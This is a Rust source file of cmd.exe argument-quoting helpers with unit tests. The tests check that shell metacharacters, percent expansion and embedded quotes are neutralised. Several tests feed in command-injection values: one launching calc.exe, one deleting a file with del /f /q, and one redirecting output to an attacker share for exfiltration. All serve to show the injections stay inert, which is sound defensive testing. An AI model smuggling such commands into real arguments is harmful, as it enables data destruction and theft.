//! Pure cmd.exe argument-quoting helpers.
//!
//! These functions implement cmd.exe's quoting rules as pure string
//! manipulation — they touch no Windows API — so they are compiled and tested
//! on every platform. The Windows-only subprocess runtime calls them when
//! building a `cmd.exe /V:OFF /S /C "..."` command line for `.bat`/`.cmd`
//! wrappers; the cross-platform test suite exercises the injection defenses
//! on Linux CI runners, which would otherwise give zero coverage of the
//! quoting logic (#5012).

// On non-Windows targets these functions are only reached from tests (the
// production caller in `invocation.rs` is `#[cfg(windows)]`). Suppress the
// dead-code lint rather than gating compilation, so the test module can
// exercise the injection defenses on every platform.
#![cfg_attr(not(any(windows, test)), allow(dead_code))]

use std::path::Path;

/// Quote a single argument for use inside a `cmd.exe /V:OFF /S /C "..."` command line.
///
/// ## cmd.exe quoting rules inside double-quoted regions
///
/// Once cmd.exe sees an opening `"` it enters a quoted region. Inside that region:
///
/// - Characters like `&`, `|`, `<`, `>`, `(`, and `)` are literal; they do not
///   need `^` escaping.
/// - `^` is also literal in a quoted region, so doubling it would change the
///   argument seen by the child process.
/// - `%` is still processed by the variable-substitution pass, which runs before
///   the shell-metachar pass and is not suppressed by quoting. Double it (`%%`)
///   to produce a literal `%`.
/// - `!` would be processed by the delayed-expansion pass when `/V:ON` is in
///   effect. We invoke cmd.exe with `/V:OFF` to suppress this entirely, so `!`
///   needs no escaping here.
/// - To embed a literal `"` inside a double-quoted cmd.exe token, use `""` (the
///   cmd.exe shell convention). The `\"` form is for `CommandLineToArgvW` (the
///   Win32 C-runtime argv parser), which is a different parser from the cmd.exe
///   shell command-line parser.
pub(crate) fn windows_quote_for_cmd(arg: &str) -> String {
    let mut escaped = String::with_capacity(arg.len() + 2);
    escaped.push('"');
    for ch in arg.chars() {
        match ch {
            '%' => escaped.push_str("%%"),
            '"' => escaped.push_str("\"\""),
            _ => escaped.push(ch),
        }
    }
    escaped.push('"');
    escaped
}

/// Whether `program` is a `.bat`/`.cmd` wrapper that must be run via `cmd.exe`.
///
/// Pure extension check — no filesystem access.
pub(crate) fn windows_requires_cmd_shell(program: &str) -> bool {
    Path::new(program)
        .extension()
        .and_then(|ext| ext.to_str())
        .map(|ext| ext.eq_ignore_ascii_case("bat") || ext.eq_ignore_ascii_case("cmd"))
        .unwrap_or(false)
}

#[cfg(test)]
mod tests {
    use super::*;

    // ---- windows_quote_for_cmd ----

    #[test]
    fn quote_wraps_in_double_quotes() {
        assert_eq!(windows_quote_for_cmd("hello"), "\"hello\"");
    }

    #[test]
    fn quote_empty_string() {
        assert_eq!(windows_quote_for_cmd(""), "\"\"");
    }

    #[test]
    fn quote_metacharacters_are_literal_inside_quotes() {
        // Inside a cmd.exe double-quoted region, shell metacharacters
        // (& | < > ( )) are literal — no ^ prefix is used.
        // ^ is literal — must NOT be doubled.
        // % is doubled to prevent %VAR% expansion.
        // " is doubled (cmd.exe "" convention), not backslash-escaped.
        let quoted = windows_quote_for_cmd(r#"profile&name|1>%TEMP%^"x""#);
        assert_eq!(quoted, r#""profile&name|1>%%TEMP%%^""x""""#);
    }

    #[test]
    fn quote_caret_not_doubled() {
        // A regression that erroneously doubled `^` inside quoted regions.
        // Inside a cmd.exe double-quoted region `^` is literal and must not be
        // escaped.
        let quoted = windows_quote_for_cmd(r"foo^bar");
        assert_eq!(quoted, r#""foo^bar""#);
    }

    #[test]
    fn quote_embedded_quote_uses_doubling() {
        // cmd.exe convention: "" represents a literal " inside a quoted token.
        // The `\"` form is the CommandLineToArgvW convention and is WRONG here.
        let quoted = windows_quote_for_cmd(r#"arg"with"quotes"#);
        assert_eq!(quoted, r#""arg""with""quotes""#);
    }

    #[test]
    fn quote_percent_sign_doubled() {
        // % is doubled to prevent %VAR% / %TEMP% expansion.
        assert_eq!(windows_quote_for_cmd("100%"), "\"100%%\"");
        assert_eq!(windows_quote_for_cmd("%TEMP%"), "\"%%TEMP%%\"");
    }

    #[test]
    fn quote_injection_attempt_is_inert() {
        // An attacker-controlled arg like `&calc.exe` must not break out of
        // the quoted token. After quoting, cmd.exe sees `&` as a literal
        // character inside the double-quoted region.
        let quoted = windows_quote_for_cmd("&calc.exe");
        assert_eq!(quoted, "\"&calc.exe\"");
    }

    #[test]
    fn quote_pipe_injection_is_inert() {
        let quoted = windows_quote_for_cmd("|del /f /q important.txt");
        assert_eq!(quoted, "\"|del /f /q important.txt\"");
    }

    #[test]
    fn quote_redirect_injection_is_inert() {
        let quoted = windows_quote_for_cmd(">\\\\attacker\\share\\exfil.txt");
        assert_eq!(quoted, "\">\\\\attacker\\share\\exfil.txt\"");
    }

    #[test]
    fn quote_exclamation_not_escaped() {
        // ! needs no escaping because cmd.exe is invoked with /V:OFF, which
        // disables delayed expansion entirely. Escaping it would change the
        // argument seen by the child process.
        let quoted = windows_quote_for_cmd("hello!world");
        assert_eq!(quoted, "\"hello!world\"");
    }

    #[test]
    fn quote_unicode_preserved() {
        // Non-ASCII characters are passed through unchanged.
        let quoted = windows_quote_for_cmd("héllo→世界");
        assert_eq!(quoted, "\"héllo→世界\"");
    }

    // ---- windows_requires_cmd_shell ----

    #[test]
    fn requires_cmd_shell_bat() {
        assert!(windows_requires_cmd_shell("perltidy.bat"));
        assert!(windows_requires_cmd_shell("C:\\tools\\perltidy.bat"));
        assert!(windows_requires_cmd_shell("perltidy.BAT")); // case-insensitive
    }

    #[test]
    fn requires_cmd_shell_cmd() {
        assert!(windows_requires_cmd_shell("wrapper.cmd"));
        assert!(windows_requires_cmd_shell("C:\\path\\wrapper.CMD"));
    }

    #[test]
    fn requires_cmd_shell_not_for_exe_or_bare() {
        assert!(!windows_requires_cmd_shell("perltidy.exe"));
        assert!(!windows_requires_cmd_shell("perltidy"));
        assert!(!windows_requires_cmd_shell("perltidy.pl"));
    }

    #[test]
    fn requires_cmd_shell_not_for_no_extension() {
        assert!(!windows_requires_cmd_shell("Makefile"));
        assert!(!windows_requires_cmd_shell("/usr/bin/perl"));
    }
}
